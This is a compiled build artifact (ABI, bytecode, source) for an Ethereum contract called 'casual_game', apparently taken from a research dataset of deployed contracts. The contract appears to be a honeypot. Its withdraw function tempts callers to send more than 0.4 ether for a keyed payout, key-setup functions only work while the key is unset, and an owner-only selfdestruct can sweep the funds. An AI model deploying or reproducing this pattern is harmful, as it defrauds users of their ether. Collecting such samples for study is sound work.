{
  "contractName": "casual_game",
  "abi": [
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "key",
          "type": "string"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "key",
          "type": "string"
        }
      ],
      "name": "setup_key",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "new_hash",
          "type": "bytes32"
        }
      ],
      "name": "chage_hash",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "clear",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "get_id",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f6efd650ce91442d0212b06c013a86d4a66177f8b9853fb69ba00b6392a730b1860010260029060001916905534801561003d57600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506105198061008e6000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806331fb67c21461006f5780633495e224146100cb57806352efea6e146100fc5780637ccb13c414610113578063f43fa8051461017c575b005b6100c9600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506101af565b005b3480156100d757600080fd5b506100fa600480360381019080803560001916906020019092919050505061033c565b005b34801561010857600080fd5b5061011161035d565b005b34801561011f57600080fd5b5061017a600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506103f4565b005b34801561018857600080fd5b506101916104e3565b60405180826000191660001916815260200191505060405180910390f35b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156101e957600080fd5b806040516020018082805190602001908083835b60208310151561022257805182526020820191506020810190506020830392506101fd565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b60208310151561028b5780518252602082019150602081019050602083039250610266565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600019166000546000191614156103395767058d15e176280000341115610338573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610336573d6000803e3d6000fd5b505b5b50565b600060010260005460001916141561035a5780600081600019169055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103b957600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b60006001026000546000191614156104e057806040516020018082805190602001908083835b60208310151561043f578051825260208201915060208101905060208303925061041a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040516020818303038152906040526040518082805190602001908083835b6020831015156104a85780518252602082019150602081019050602083039250610483565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600081600019169055505b50565b60006002549050905600a165627a7a723058204059ba5d8fe6f077682bf9fbc19cad01a744fb76081d6a984b0819026a3cd9720029",
  "source": "\n\ncontract casual_game\n{\n    bytes32 keyHash;\n    address owner;\n    bytes32 wallet_id = 0x6efd650ce91442d0212b06c013a86d4a66177f8b9853fb69ba00b6392a730b18;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function withdraw(string key) public payable\n    {\n        require(msg.sender == tx.origin);\n        if(keyHash == keccak256(abi.encodePacked(key))) {\n            if(msg.value > 0.4 ether) {\n                msg.sender.transfer(address(this).balance);\n            }\n        }\n    }\n\n    function setup_key(string key) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = keccak256(abi.encodePacked(key));\n        }\n    }\n\n    function chage_hash(bytes32 new_hash) public\n    {\n        if (keyHash == 0x0) {\n            keyHash = new_hash;\n        }\n    }\n\n    function clear() public\n    {\n        require(msg.sender == owner);\n        selfdestruct(owner);\n    }\n\n    function get_id() public view returns(bytes32){\n        return wallet_id;\n    }\n\n    function () public payable {\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xac87b21684af3809d1aa6fee9ee05068bdacb3fe/contracts/0xac87b21684af3809d1aa6fee9ee05068bdacb3fe.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:42:45.897Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}